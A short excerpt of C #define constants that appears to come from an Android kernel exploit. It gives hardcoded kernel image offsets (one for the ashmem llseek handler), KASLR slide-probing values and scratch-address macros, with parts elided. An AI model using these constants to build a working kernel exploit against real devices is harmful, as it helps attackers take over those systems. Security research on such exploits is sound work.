...
#define ASHMEM_LLSEEK_OFF 0x00ca7678ULL
...
#define SLIDE_LOCK_STRIDE 0x20ULL
#define SLIDE_LOCK_SLOT_MAX 128

#define SLIDE_BSS_SAFE_TASK P0_DATA_ALIAS_CONST(KIMAGE_TEXT_BASE + SLIDE_BSS_LOCK_OFF - 0xF60)

#define SLIDE_PROBE_SCRATCH_OFF 0x0248DF60ULL
#define PROBE_SCRATCH \
  P0_DATA_ALIAS_CONST(KIMAGE_TEXT_BASE + SLIDE_PROBE_SCRATCH_OFF)
